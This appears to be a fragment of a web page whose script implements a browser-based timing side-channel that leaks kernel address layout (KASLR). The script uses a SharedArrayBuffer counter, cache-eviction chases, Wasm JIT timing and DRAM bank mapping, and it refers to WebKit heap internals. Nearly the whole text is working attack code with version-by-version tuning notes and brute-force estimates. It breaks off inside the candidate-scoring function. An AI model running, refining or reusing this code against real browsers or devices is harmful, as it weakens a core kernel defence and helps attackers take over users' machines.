</div>
<pre id="log"></pre>
<script>
// ═══════════════════════════════════════════════════════════════════════════
// SECTION A: KASLR ORACLE v19 (verbatim functions)
// ═══════════════════════════════════════════════════════════════════════════

// timer-kaslr-v15
//
// v14 analysis:
//   T7x: 22 bank pairs (excellent, up from 13) — data anchor working perfectly
//   T4: ALL 32 allocs = 0ns — evictB (40MB chase) is sharing SLC sets with heap bufs
//     → walking evictB re-warms heap buf cache lines as collateral
//     → net: bufs always SLC-warm, 0ns reads, 1 cluster, only 3 bits leaked
//   T5: hot=0ns for all anchors — SAB quantization (fast reads <1 SAB count)
//     → evictability ratio = cold/0.5 (near-zero denominator) → false "evictable"
//
// v15 T4 fix: SELF-EVICTION
//   Walk ALL 32 heap bufs in sequence as the eviction pass (32×2MB=64MB=4×SLC).
//   Since the bufs themselves are the eviction walk, they MUST end up cold after
//   the full walk — each buf's SLC lines get displaced by the subsequent bufs.
//   No external eviction buffer needed. The last buf read is cold because the
//   earlier bufs' lines filled SLC. Measure each buf immediately after the walk.
//   Repeat: walk-all → measure-all, REPS times. p25 of each buf's cold readings.
//
//   Bonus: also try cross-eviction (walk bufs in reverse order before measuring
//   each forward), and if still all-0, increase to 4MB bufs.
//
// v15 T5 fix: minimum hot floor
//   hot = max(measured, 5ns) to prevent divide-by-near-zero in ratio check.
//   Also measure hot with REPS=16 (more reps → p25 more stable).
//   Fix evictability threshold: coldNS > max(hotNS*2, 50ns) AND coldNS > 80ns.
//
// v15 T10 fix: T4-failure fallback
//   When c0Ratio=100% (all allocs in C0, T4 completely failed), switch to
//   bank-primary scoring — use bank pair topology as the main signal, skip
//   heap spread components that would give same score to all candidates.
//   Also: when T4 fails, attempt a re-allocation run (freshly allocated bufs
//   in a new call) to see if a new Gigacage placement gives better spread.

const LOG = document.getElementById('log');
const log = s => { LOG.textContent += s + '\n'; console.log(s); };

// v20: catch silent failures that would otherwise kill the async IIFE with zero output
window.addEventListener('unhandledrejection', e => {
  log(`[!!!] UNHANDLED REJECTION: ${e.reason}`);
  if (e.reason && e.reason.stack) log(`[!!!] Stack: ${e.reason.stack}`);
});
window.onerror = (msg, src, line, col, err) => {
  log(`[!!!] GLOBAL ERROR: ${msg} @ ${src}:${line}:${col}`);
  if (err && err.stack) log(`[!!!] Stack: ${err.stack}`);
};

let counterWorker = null;
let counterView   = null;
let NS = 8.0;

const COUNTER_SRC = `
  self.onmessage = function(e) {
    if (e.data.cmd === 'start') {
      const c = new Int32Array(e.data.sab, 4096, 1);
      while (true) Atomics.add(c, 0, 1);
    }
  };
`;

async function startCounter() {
  const sab = new SharedArrayBuffer(8192);
  counterView = new Int32Array(sab, 4096, 1);
  const w = new Worker(URL.createObjectURL(new Blob([COUNTER_SRC],{type:'application/javascript'})));
  w.postMessage({cmd:'start', sab});
  counterWorker = w;
  await new Promise(r=>setTimeout(r,200));
}
const rdcnt = () => Atomics.load(counterView, 0);

function buildChase(sizeBytes) {
  const LINE = 64;
  const entries = Math.floor(sizeBytes / LINE);
  const arr = new Int32Array(entries * 16);
  const order = new Int32Array(entries);
  for (let i = 0; i < entries; i++) order[i] = i;
  for (let i = entries-1; i > 0; i--) {
    const j = (Math.random() * (i+1)) | 0;
    const t = order[i]; order[i] = order[j]; order[j] = t;
  }
  for (let i = 0; i < entries; i++) arr[order[i]*16] = order[(i+1)%entries];
  let s=0; for(let i=0;i<arr.length;i+=16) s+=arr[i]; arr[0]^=s&0;
  let idx=0; for(let i=0;i<entries;i++) idx=arr[idx*16]; arr[0]^=idx&0;
  return { arr, entries };
}

function chaseTime(arr, startIdx, steps) {
  const t0 = rdcnt();
  let idx = startIdx;
  for (let i = 0; i < steps; i++) idx = arr[idx * 16];
  return (rdcnt() - t0 + (idx & 0)) / steps;
}

function evictFull(chase) {
  let idx=0;
  for(let p=0;p<2;p++)
    for(let i=0;i<chase.entries;i++) idx=chase.arr[idx*16];
  chase.arr[0]^=idx&0;
}

// Self-eviction: walk all bufs in sequence — guaranteed cold after full walk
function selfEvict(bufs) {
  let idx=0;
  for(const b of bufs){
    for(let p=0;p<1;p++)
      for(let i=0;i<b.ch.entries;i++) idx=b.ch.arr[idx*16];
  }
  if(bufs.length>0) bufs[0].ch.arr[0]^=idx&0;
}

// ─────────────────────────────────────────────────────────────
// T1: Calibrate
// ─────────────────────────────────────────────────────────────
async function t1() {
  log('─── T1: Calibrate ───');
  const w0=performance.now(), c0=rdcnt();
  await new Promise(r=>setTimeout(r,50));
  const c1=rdcnt(), w1=performance.now();
  NS=(w1-w0)*1e6/(c1-c0);
  log(`[*] T1 ${(c1-c0)} counts / ${(w1-w0).toFixed(1)}ms = ${NS.toFixed(3)}ns/count`);
  log(`[*] T1 L1≈5ns=${(5/NS).toFixed(1)}cts  L3≈30ns=${(30/NS).toFixed(1)}cts  DRAM≈130ns=${(130/NS).toFixed(1)}cts`);
}

// ─────────────────────────────────────────────────────────────
// T2: DRAM signal confirm
// ─────────────────────────────────────────────────────────────
async function t2() {
  log('─── T2: DRAM signal confirm ───');
  const hot  = buildChase(4*1024);
  const cold = buildChase(32*1024*1024);
  await new Promise(r=>setTimeout(r,50));
  const STEPS=64, REPS=40;
  let hi=0; for(let r=0;r<hot.entries*4;r++) hi=hot.arr[hi*16]; hot.arr[0]^=hi&0;
  const hotT=[], coldT=[];
  for(let r=0;r<REPS;r++){
    hotT.push(chaseTime(hot.arr,0,STEPS));
    coldT.push(chaseTime(cold.arr,r%cold.entries,STEPS));
  }
  hotT.sort((a,b)=>a-b); coldT.sort((a,b)=>a-b);
  const hp50=hotT[20]*NS, cp50=coldT[20]*NS;
  log(`[*] T2 hot p50=${hp50.toFixed(1)}ns  cold p50=${cp50.toFixed(1)}ns  ratio=${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
  if(cp50>hp50*3&&cp50>30) log(`[!!!] T2 DRAM signal confirmed: ${(cp50/Math.max(hp50,.01)).toFixed(1)}x`);
  return { hasDRAM:cp50>30, dramNS:cp50, hotNS:hp50 };
}

// ─────────────────────────────────────────────────────────────
// T3: Wasm JIT
// ─────────────────────────────────────────────────────────────
async function t3() {
  log('─── T3: Wasm JIT (96 modules, evictA for partition detection) ───');
  const makeWasm = (lo, hi) => new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
    0x03,0x02,0x01,0x00,
    0x07,0x08,0x01,0x04,0x63,0x61,0x6c,0x6c,0x00,0x00,
    0x0a,0x0c,0x01,0x0a,0x00,
    0x20,0x00,0x41,lo&0x7f,0x6a,0x41,hi&0x7f,0x6a,0x0b,
  ]);
  try {
    const test=await WebAssembly.instantiate(makeWasm(1,2));
    if(test.instance.exports.call(10)!==13){ log('[!] T3 binary fail'); return null; }
  } catch(e){ log(`[!] T3: ${e.message}`); return null; }

  const N=96, fns=[];
  for(let i=0;i<N;i++){
    try {
      const inst=await WebAssembly.instantiate(makeWasm(i&0x7f,(i*7)&0x7f));
      fns.push({fn:inst.instance.exports.call, id:i});
    } catch(e){}
  }
  log(`[*] T3 compiled ${fns.length}/${N}`);
  if(!fns.length) return null;

  log(`[*] T3 building evictA (24MB)...`);
  const evictA = buildChase(24*1024*1024);
  await new Promise(r=>setTimeout(r,30));

  for(const {fn} of fns){ let x=0; for(let i=0;i<200;i++) x+=fn(i); }

  const BATCH=64, ROUNDS=8;
  const coldReps=Array.from({length:N},()=>[]);
  const hotAcc=new Array(N).fill(0);

  log(`[*] T3 running ${ROUNDS} rounds...`);
  for(let round=0;round<ROUNDS;round++){
    evictFull(evictA);
    for(const {fn,id} of fns){
      const t0=rdcnt(); let x=0;
      for(let b=0;b<BATCH;b++) x+=fn(b);
      coldReps[id].push((rdcnt()-t0+(x&0))/BATCH*NS);
    }
    for(const {fn,id} of fns){
      const t0=rdcnt(); let x=0;
      for(let b=0;b<BATCH;b++) x+=fn(b);
      hotAcc[id]+=(rdcnt()-t0+(x&0))/BATCH;
    }
  }

  const results=fns.map(({id})=>{
    const rs=[...coldReps[id]].sort((a,b)=>a-b);
    const p25=rs[Math.floor(rs.length*0.25)];
    const mean=rs.reduce((a,b)=>a+b,0)/rs.length;
    const std=Math.sqrt(rs.reduce((a,b)=>a+(b-mean)**2,0)/rs.length);
    return {id, cold:p25, hot:hotAcc[id]/ROUNDS*NS, cv:std/Math.max(mean,0.1)};
  });

  results.sort((a,b)=>b.cold-a.cold);
  const cMin=Math.min(...results.map(r=>r.cold));
  const cMax=Math.max(...results.map(r=>r.cold));
  log(`[*] T3 cold p25 spread: min=${cMin.toFixed(0)}ns max=${cMax.toFixed(0)}ns ratio=${(cMax/Math.max(cMin,0.1)).toFixed(1)}x`);
  log(`[*] T3 top-5: ${results.slice(0,5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);

  const slcHot=results.filter(r=>r.cold<40);
  const dramCold=results.filter(r=>r.cold>=40);
  log(`[*] T3 SLC-pinned (<40ns): ${slcHot.length}  DRAM-evictable (≥40ns): ${dramCold.length}`);
  if(slcHot.length&&dramCold.length) log(`[!!!] T3 JIT POOL PARTITION: ${slcHot.length} SLC + ${dramCold.length} DRAM`);
  return {results, slcHot, dramCold, evictA};
}

// ─────────────────────────────────────────────────────────────
// T4: Heap fingerprint (v15 — SELF-EVICTION)
//
// v14 bug: evictB (40MB external buffer) shares SLC sets with heap bufs.
// Walking evictB evicts+warms the same SLC sets as heap bufs → net: bufs stay warm.
//
// v15 fix: use heap bufs to evict EACH OTHER.
//   Phase 1: Walk ALL 32 bufs in sequence (64MB total). This guarantees every buf's
//     lines end up cold — each buf's SLC lines are displaced by subsequent bufs.
//   Phase 2: Immediately measure all bufs cold (no extra eviction needed).
//   Repeat REPS times. p25 of each buf's measurements.
//
// Fallback: if still all-0ns (allocs somehow still hot), increase to 4MB bufs.
// ─────────────────────────────────────────────────────────────
async function t4() {
  log('─── T4: Heap fingerprint (v15: self-eviction) ───');
  const N=32, SZ=2*1024*1024, STEPS=64, REPS=20;
  log(`[*] T4 allocating ${N} × 2MB...`);
  const bufs=[];
  for(let i=0;i<N;i++) bufs.push({ch:buildChase(SZ), id:i});
  await new Promise(r=>setTimeout(r,50));

  // Check if self-eviction approach works by doing a quick sanity test
  // Walk all bufs once, then measure buf[0] — if still 0ns, we have a problem
  const timingSets=bufs.map(()=>[]);

  for(let rep=0;rep<REPS;rep++){
    if(rep>0&&rep%5===0) await new Promise(r=>setTimeout(r,0)); // yield
    // SELF-EVICTION: walk all bufs in sequence to cold all of them
    selfEvict(bufs);
    // Walk bufs in reverse order one more time for good measure
    let idx2=0;
    for(let i=bufs.length-1;i>=0;i--){
      for(let j=0;j<bufs[i].ch.entries;j+=Math.max(1,Math.floor(bufs[i].ch.entries/512)))
        idx2=bufs[i].ch.arr[idx2%bufs[i].ch.entries*16]||0;
    }
    bufs[0].ch.arr[0]^=idx2&0;
    // Measure all bufs cold immediately after eviction
    for(let i=0;i<N;i++)
      timingSets[i].push(chaseTime(bufs[i].ch.arr, (rep*7)%bufs[i].ch.entries, STEPS));
  }

  const medians=timingSets.map((ts,i)=>{
    ts.sort((a,b)=>a-b);
    return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS};
  });
  medians.sort((a,b)=>a.ns-b.ns);

  const tMin=medians[0].ns, tMax=medians[medians.length-1].ns;
  log(`[*] T4 self-evict spread (p25): ${tMin.toFixed(1)}–${tMax.toFixed(1)}ns = ${(tMax/Math.max(tMin,0.1)).toFixed(1)}x`);

  // If all-0ns, try again with external large eviction (60MB)
  if(tMax < 10){
    log(`[!] T4 self-eviction gave all-0ns — trying 60MB external eviction`);
    const evictLarge=buildChase(60*1024*1024);
    await new Promise(r=>setTimeout(r,30));
    const ts2=bufs.map(()=>[]);
    for(let rep=0;rep<REPS;rep++){
      evictFull(evictLarge);
      evictFull(evictLarge); // triple pass
      evictFull(evictLarge);
      for(let i=0;i<N;i++)
        ts2[i].push(chaseTime(bufs[i].ch.arr, (rep*7)%bufs[i].ch.entries, STEPS));
    }
    const med2=ts2.map((ts,i)=>{ ts.sort((a,b)=>a-b); return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS}; });
    med2.sort((a,b)=>a.ns-b.ns);
    const t2Max=med2[med2.length-1].ns;
    log(`[*] T4 large-evict spread: ${med2[0].ns.toFixed(1)}–${t2Max.toFixed(1)}ns`);
    if(t2Max > tMax){
      log(`[*] T4 large-evict better — using`);
      med2.sort((a,b)=>a.ns-b.ns);
      const clusters=clusterMedians(med2);
      logClusters(clusters);
      return {medians:med2, clusters, evictB:evictLarge, bufs, selfEvict:false};
    }
  }

  const clusters=clusterMedians(medians);
  logClusters(clusters);
  return {medians, clusters, evictB:null, bufs, selfEvict:true};
}

function clusterMedians(medians){
  const clusters=[];
  let cur=[medians[0]];
  for(let i=1;i<medians.length;i++){
    if(medians[i].ns>medians[i-1].ns*1.4&&medians[i].ns-medians[i-1].ns>15){
      clusters.push([...cur]); cur=[medians[i]];
    } else cur.push(medians[i]);
  }
  clusters.push(cur);
  return clusters;
}

function logClusters(clusters){
  log(`[*] T4 clusters (${clusters.length}):`);
  clusters.forEach((cl,ci)=>{
    const ns=cl.map(m=>m.ns);
    log(`[*] T4   C${ci}: ${cl.length} allocs, ${Math.min(...ns).toFixed(0)}-${Math.max(...ns).toFixed(0)}ns, ids:[${cl.map(m=>m.id).join(',')}]`);
  });
  if(clusters.length>=2) log(`[!!!] T4 HEAP CLUSTERS: ${clusters.length} groups`);
}

// ─────────────────────────────────────────────────────────────
// T6: Entropy
// ─────────────────────────────────────────────────────────────
async function t6(jitData, heapData) {
  log('─── T6: Bit extraction + entropy ───');
  if(!jitData||!heapData){ log('[*] T6 skip'); return null; }
  const dramCold=jitData.results.filter(r=>r.cold>=40);
  const cacheHot=jitData.results.filter(r=>r.cold<40);
  const numClusters=heapData.clusters.length;
  const clusterBits=Math.min(4,Math.ceil(Math.log2(Math.max(numClusters,2))));
  const jitPartBit=(jitData.slcHot.length>0&&dramCold.length>0)?1:0;
  const heapMax=heapData.medians[heapData.medians.length-1].ns;
  const heapMin=heapData.medians[0].ns;
  const pageColorBits=Math.min(7,Math.ceil(Math.log2(Math.max(heapMax/Math.max(heapMin,1),2))));
  const totalLeaked=pageColorBits+jitPartBit+clusterBits;
  const aslrBits=19;
  const remaining=Math.max(0,aslrBits-totalLeaked);
  log(`[*] T6 page color: ${pageColorBits}b  JIT partition: ${jitPartBit}b  heap cluster: ${clusterBits}b`);
  log(`[*] T6 total leaked: ${totalLeaked} / ${aslrBits} bits → remaining: ${remaining} bits = ${(2**remaining).toLocaleString()} candidates`);
  if(remaining<=12) log(`[!!!] T6 BRUTE-FORCEABLE: ${2**remaining} candidates at 1ms/probe → ${((2**remaining)/1000).toFixed(3)}s`);
  return {remaining, totalLeaked, pageColorBits, jitPartBit, clusterBits, numClusters, slcCount:cacheHot.length, dramCount:dramCold.length};
}

// ─────────────────────────────────────────────────────────────
// T5: Data anchor validation (v15 — hot floor fix)
//
// v14 bug: hot=0ns for all anchors due to SAB quantization.
//   With hot=0, ratio = cold/max(0,0.5) = enormous → all "evictable" even if cold
//   is still SLC-speed.
// v15 fix: floor hot at 5ns (typical L2 speed), ensure cold > 80ns (DRAM floor).
// Also: use REPS=16 for hot measurement and higher STEPS for better resolution.
// ─────────────────────────────────────────────────────────────
async function t5(evictA) {
  log('─── T5: Data anchor validation (v15) ───');
  const N_ANCHORS = 4;
  const ANCHOR_SZ = 256*1024;
  const STEPS = 256; // more steps = more counts = better resolution
  const REPS_HOT = 16;
  const REPS_COLD = 8;

  log(`[*] T5 building ${N_ANCHORS} data anchors (${ANCHOR_SZ/1024}KB each)...`);
  const anchors = [];
  for(let i=0;i<N_ANCHORS;i++) anchors.push({ch: buildChase(ANCHOR_SZ), id:i});
  await new Promise(r=>setTimeout(r,30));

  // Warm all anchors together
  for(const a of anchors){
    let idx=0;
    for(let p=0;p<4;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }
  await new Promise(r=>setTimeout(r,10));

  // Measure HOT with more reps and higher STEPS for better SAB resolution
  const hotNS = anchors.map(a=>{
    const ts=[];
    for(let r=0;r<REPS_HOT;r++) ts.push(chaseTime(a.ch.arr,0,STEPS)*NS);
    ts.sort((a,b)=>a-b);
    const raw = ts[Math.floor(ts.length*0.25)];
    return Math.max(raw, 5.0); // floor at 5ns (L2 minimum)
  });

  // Re-warm before cold measurement
  for(const a of anchors){
    let idx=0;
    for(let p=0;p<2;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }

  // Cold measurement: evict, then measure each anchor
  const coldNS = anchors.map(a=>{
    const ts=[];
    for(let r=0;r<REPS_COLD;r++){
      evictFull(evictA);
      evictFull(evictA);
      const t0=rdcnt();
      let idx=0;
      for(let s=0;s<STEPS;s++) idx=a.ch.arr[idx*16];
      ts.push((rdcnt()-t0+(idx&0))/STEPS*NS);
    }
    ts.sort((x,y)=>x-y);
    return ts[Math.floor(ts.length*0.25)];
  });

  let allEvictable = true;
  anchors.forEach((a,i)=>{
    const ratio = coldNS[i] / hotNS[i]; // hotNS has floor so no divide-by-near-zero
    const evictable = coldNS[i] > hotNS[i]*2 && coldNS[i] > 80; // 80ns DRAM floor
    if(!evictable) allEvictable=false;
    const hotRaw = coldNS[i] > 80 ? `(raw: was low, floored)` : '';
    log(`[*] T5   anchor[${i}]: hot=${hotNS[i].toFixed(0)}ns cold=${coldNS[i].toFixed(0)}ns ratio=${ratio.toFixed(1)}x ${evictable?'✓ evictable':'✗ NOT evictable'}`);
  });

  const evictableAnchors = anchors.filter((_,i)=>coldNS[i]>hotNS[i]*2&&coldNS[i]>80);
  log(`[*] T5 ${evictableAnchors.length>0?'[!!!] DATA ANCHORS EVICTABLE':'[!] WARNING'}: ${evictableAnchors.length}/${N_ANCHORS} anchors truly DRAM-cold`);
  log(`[*] T5 using ${evictableAnchors.length} evictable anchors for T7x`);

  return {anchors, evictableAnchors, hotNS, coldNS, allEvictable: evictableAnchors.length===N_ANCHORS};
}

// ─────────────────────────────────────────────────────────────
// T7x: DATA ANCHOR bank mapping (v15 — same as v14 but uses evictableAnchors)
// ─────────────────────────────────────────────────────────────
async function t7x(anchorData, heapData, evictA) {
  log('─── T7x: Bank mapping (v15: data anchor) ───');
  if(!anchorData||!heapData){ log('[*] T7x skip'); return null; }

  const BASELINE_MIN_NS = 60;
  const CORR_THRESHOLD  = 1.3;
  const STEPS = 128;
  const REPS_BASE = 3;
  const REPS_EVICT = 6;

  const anchors = anchorData.evictableAnchors.length > 0
    ? anchorData.evictableAnchors
    : anchorData.anchors; // fallback: use all if none pass T5
  if(!anchors.length){ log('[!] T7x no anchors — skip'); return null; }

  log(`[*] T7x using ${anchors.length} data anchors`);
  log(`[*] T7x baseline threshold: ${BASELINE_MIN_NS}ns  corr threshold: ${(CORR_THRESHOLD*100).toFixed(0)}%`);

  const N=heapData.bufs.length;
  const bankTable=[];
  const correlatedPairs=[];

  function warmAnchor(a) {
    let idx=0;
    for(let p=0;p<3;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
    a.ch.arr[0]^=idx&0;
  }

  log(`[*] T7x testing ${N} allocs...`);
  const hdr = anchors.map(a=>`anc${a.id}`).join('         ');
  log(`[*] T7x   alloc   heapNs  | ${hdr}`);

  for(let i=0;i<N;i++){
    if(i>0&&i%2===0) await new Promise(r=>setTimeout(r,0));
    const buf=heapData.bufs[i];
    const heapNs=heapData.medians.find(m=>m.id===buf.id)?.ns||0;
    const matches=[];
    let allocBankScore=0;
    let allocMaxEff=0;

    for(const anc of anchors){
      warmAnchor(anc);
      const bTs=[];
      for(let r=0;r<REPS_BASE;r++){
        evictFull(evictA);
        const t0=rdcnt();
        let idx=0;
        for(let s=0;s<STEPS;s++) idx=anc.ch.arr[idx*16];
        bTs.push((rdcnt()-t0+(idx&0))/STEPS*NS);
      }
      bTs.sort((a,b)=>a-b);
      const freshBase=bTs[Math.floor(bTs.length*0.25)];

      if(freshBase < BASELINE_MIN_NS){
        matches.push({ancId:anc.id, skipped:true, reason:`base=${freshBase.toFixed(0)}ns<${BASELINE_MIN_NS}ns`});
        continue;
      }

      const eTs=[];
      for(let r=0;r<REPS_EVICT;r++){
        warmAnchor(anc);
        evictFull(buf.ch);
        evictFull(evictA);
        const t0=rdcnt();
        let idx=0;
        for(let s=0;s<STEPS;s++) idx=anc.ch.arr[idx*16];
        eTs.push((rdcnt()-t0+(idx&0))/STEPS*NS);
      }
      eTs.sort((a,b)=>a-b);
      const postEvict=eTs[Math.floor(eTs.length*0.25)];
      const eff=postEvict/Math.max(freshBase,1);
      const correlated=eff>=CORR_THRESHOLD;

      matches.push({ancId:anc.id, freshBase, postEvict, eff, correlated, skipped:false});
      if(correlated){
        correlatedPairs.push({allocId:buf.id, heapNs, ancId:anc.id, eff, freshBase, postEvict});
        allocBankScore += eff;
        allocMaxEff = Math.max(allocMaxEff, eff);
      }
    }

    bankTable.push({allocId:buf.id, heapNs, matches, allocBankScore, allocMaxEff});

    const cols=matches.map(m=>{
      if(m.skipped) return `SKIP(${m.reason})`;
      return `${m.postEvict.toFixed(0)}ns/${(m.eff*100).toFixed(0)}%${m.correlated?'✓':'✗'}`;
    }).join('  ');
    const anyCorr=matches.some(m=>!m.skipped&&m.correlated);
    log(`[*] T7x   [${String(buf.id).padStart(2)}]   ${heapNs.toFixed(0)}ns  ${anyCorr?'★':' '} | ${cols}`);
  }

  log(`[*] T7x correlated pairs: ${correlatedPairs.length}`);
  correlatedPairs.forEach(p=>{
    log(`[!!!] T7x BANK MATCH: alloc[${p.allocId}](${p.heapNs.toFixed(0)}ns) ↔ anc${p.ancId}  base=${p.freshBase.toFixed(0)}ns post=${p.postEvict.toFixed(0)}ns eff=${(p.eff*100).toFixed(0)}%`);
  });
  if(correlatedPairs.length>1){
    log(`[!!!] T7x MULTI-ALLOC BANK MAP: ${correlatedPairs.length} pairs — PA bank bits 14-17 constrained`);
    const hitAncs=[...new Set(correlatedPairs.map(p=>p.ancId))];
    log(`[!!!] T7x anchors hit: anc[${hitAncs.join(',')}]`);

    // Bank score ranking
    const scoredAllocs=bankTable.filter(b=>b.allocBankScore>0).sort((a,b)=>b.allocBankScore-a.allocBankScore);
    log(`[*] T7x bank proximity rank (by eff sum):`);
    scoredAllocs.slice(0,10).forEach((b,i)=>{
      log(`[*] T7x   rank${i+1}: alloc[${b.allocId}](heap=${b.heapNs.toFixed(0)}ns) bankScore=${b.allocBankScore.toFixed(1)} maxEff=${(b.allocMaxEff*100).toFixed(0)}%`);
    });

    // Per-anchor bank group topology
    const anchorGroups={};
    correlatedPairs.forEach(p=>{
      if(!anchorGroups[p.ancId]) anchorGroups[p.ancId]=[];
      anchorGroups[p.ancId].push(p.allocId);
    });
    log(`[*] T7x anchor bank groups:`);
    Object.entries(anchorGroups).forEach(([ancId, allocIds])=>{
      log(`[*] T7x   anc${ancId}: allocs [${allocIds.join(',')}]`);
    });
  }

  return {bankTable, correlatedPairs, anchors};
}

// ─────────────────────────────────────────────────────────────
// T9: VA offset reconstruction (v15)
// ─────────────────────────────────────────────────────────────
async function t9(jitData, heapData, bankData) {
  log('─── T9: VA offset reconstruction (v15) ───');
  if(!heapData) { log('[*] T9 skip'); return null; }

  const medians=heapData.medians;
  const dramAllocs=medians.filter(m=>m.ns>20);

  const fitLinear = (xs, ys) => {
    if(ys.length<3) return {slope:0, intercept:0, r2:0};
    const mx=xs.reduce((a,b)=>a+b,0)/xs.length;
    const my=ys.reduce((a,b)=>a+b,0)/ys.length;
    const num=xs.reduce((a,x,i)=>a+(x-mx)*(ys[i]-my),0);
    const den=xs.reduce((a,x)=>a+(x-mx)**2,0);
    const sl=num/Math.max(den,0.001);
    const ic=my-sl*mx;
    const ssRes=ys.reduce((a,y,i)=>a+(y-(ic+sl*i))**2,0);
    const ssTot=ys.reduce((a,y)=>a+(y-my)**2,0);
    return {slope:sl, intercept:ic, r2:ssTot>0?1-ssRes/ssTot:0};
  };

  let slope=0, intercept=0, r2=0;

  if(dramAllocs.length>=3){
    const {slope:s, intercept:ic, r2:r} = fitLinear(dramAllocs.map((_,i)=>i), dramAllocs.map(a=>a.ns));
    slope=s; intercept=ic; r2=r;
    log(`[*] T9 DRAM-visible allocs: ${dramAllocs.length}`);
    log(`[*] T9 heap-rank fit: ns = ${ic.toFixed(1)} + ${s.toFixed(1)} × rank  (R²=${r.toFixed(3)})`);

    if(bankData && bankData.bankTable.length>0){
      const bsMap={};
      bankData.bankTable.forEach(b=>{ bsMap[b.allocId]=b.allocBankScore; });
      const maxBS=Math.max(...Object.values(bsMap),1);
      const dramWithBank=dramAllocs.map((m,i)=>({...m, heapRank:i, bankFrac:(bsMap[m.id]||0)/maxBS}));
      dramWithBank.sort((a,b)=>(a.heapRank - a.bankFrac*3)-(b.heapRank-b.bankFrac*3));
      const cf=fitLinear(dramWithBank.map((_,i)=>i), dramWithBank.map(d=>d.ns));
      log(`[*] T9 composite fit: ns = ${cf.intercept.toFixed(1)} + ${cf.slope.toFixed(1)} × rank  (R²=${cf.r2.toFixed(3)})`);
      if(cf.r2>r2){ slope=cf.slope; intercept=cf.intercept; r2=cf.r2; log(`[*] T9 composite rank better`); }
    }
    log(`[*] T9 best fit R²=${r2.toFixed(3)}`);
  } else {
    log(`[*] T9 DRAM-visible allocs: ${dramAllocs.length} — too few for heap rank fit`);
    // Bank-only reconstruction: use bank pairs to infer PA ordering
    if(bankData && bankData.correlatedPairs.length>0){
      const byBank=bankData.bankTable.filter(b=>b.allocBankScore>0).sort((a,b)=>b.allocBankScore-a.allocBankScore);
      log(`[*] T9 bank-only PA proxy (top 5 by bankScore):`);
      byBank.slice(0,5).forEach((b,i)=>{
        log(`[*] T9   PA-rank${i+1}: alloc[${b.allocId}] bankScore=${b.allocBankScore.toFixed(1)}`);
      });
    }
  }

  const bankMatchMap={};
  if(bankData) bankData.correlatedPairs.forEach(p=>{
    if(!bankMatchMap[p.allocId]) bankMatchMap[p.allocId]=[];
    bankMatchMap[p.allocId].push(p.ancId);
  });

  const c0=heapData.clusters[0]||[];
  log(`[*] T9 C0 (SLC-resident): ${c0.length} allocs covering ~${c0.length*2}MB from Gigacage base`);
  log(`[*] T9 bank-matched allocs: ${Object.keys(bankMatchMap).length}`);

  const jitAnchors=jitData?jitData.results.filter(r=>r.cold>=40):[];
  if(jitAnchors.length&&dramAllocs.length>=2){
    log(`[*] T9 JIT DRAM modules for reference:`);
    jitAnchors.slice(0,3).forEach(anc=>{
      const closestAlloc=dramAllocs.reduce((a,b)=>Math.abs(a.ns-anc.cold)<Math.abs(b.ns-anc.cold)?a:b);
      log(`[*] T9   m${anc.id}(${anc.cold.toFixed(0)}ns) near alloc[${closestAlloc.id}](${closestAlloc.ns.toFixed(0)}ns)`);
    });
  }

  if(jitAnchors.length) log(`[!!!] T9 VA MAP: heap C0=[0-${c0.length*2}MB] Gigacage base  JIT=[SLC+${jitAnchors.length} DRAM modules]`);

  return {slope, intercept, r2, dramAllocs, bankMatchMap};
}

// ─────────────────────────────────────────────────────────────
// T10: Candidate scorer (v15 — T4-failure aware)
//
// When T4 gives all-0ns (c0Ratio=100%, heapSpread~0), the standard
// heap-based scoring components all fire on the same branch → flat scores.
// v15 fix: detect T4 failure and switch to bank-primary scoring mode.
//
// Bank-primary mode:
//   The only meaningful signal is from T7x bank pairs.
//   With 22 pairs hitting all 4 anchors and multiple multi-anchor allocs,
//   the bank topology gives us ~4-5 bits of PA constraint.
//   We score based purely on bank consistency metrics:
//   - How many pairs (raw count)
//   - Multi-anchor allocs (tight PA constraint)
//   - Per-anchor group sizes (larger group = stronger bank signal)
//   - Spearman of allocation index vs bankScore (PA ordering from index)
//   Since all allocs show 0ns heap timing, use ALLOCATION INDEX as PA proxy
//   (bmalloc allocates sequentially → alloc[0] lowest PA, alloc[31] highest PA).
//   allocs with high bankScore AND low allocation index → anchors are low PA too
//   allocs with high bankScore AND high allocation index → anchors are high PA
//   This gives us a coarse PA position for anchors → constrains candidates.
// ─────────────────────────────────────────────────────────────
async function t10(jitData, heapData, bankData, offsetData, entropyData) {
  log('─── T10: Candidate scorer (v15 — bank-primary aware) ───');
  if(!entropyData){ log('[*] T10 skip'); return null; }

  const remaining=entropyData.remaining;
  const candidateCount=2**remaining;
  const PAGE_SIZE=16384;

  log(`[*] T10 scoring ${candidateCount} KASLR candidates (${remaining} bits remaining)`);

  const slcRatio=entropyData.slcCount/(entropyData.slcCount+entropyData.dramCount);
  const c0Size=heapData.clusters[0]?.length||0;
  const c0Ratio=c0Size/32;
  const t4Failed = c0Ratio >= 0.95; // T4 gave no discrimination

  const pairCount=bankData?.correlatedPairs?.length||0;
  const hitAncs=bankData?[...new Set(bankData.correlatedPairs.map(p=>p.ancId))]:[];
  const heapSpread=heapData.medians[heapData.medians.length-1].ns;
  const dramAllocCount=offsetData?.dramAllocs?.length||0;
  const heapSpreadRank=Math.min(heapSpread/3000,1.0);

  // Bank topology metrics
  let corrAllocsInDRAM=0, corrAllocsInC0=0, multiAnchorAllocs=0;
  let effHeapSpearman=0, maxEffAlloc=null;
  let anchorGroupSizes=[];
  let bankWeightedAllocIndex=NaN; // bank-weighted mean allocation index

  if(bankData && pairCount>0){
    const c0Ids=new Set(heapData.clusters[0]?.map(m=>m.id)||[]);
    const corrAllocIds=new Set(bankData.correlatedPairs.map(p=>p.allocId));
    corrAllocIds.forEach(id=>{
      if(c0Ids.has(id)) corrAllocsInC0++;
      else corrAllocsInDRAM++;
    });

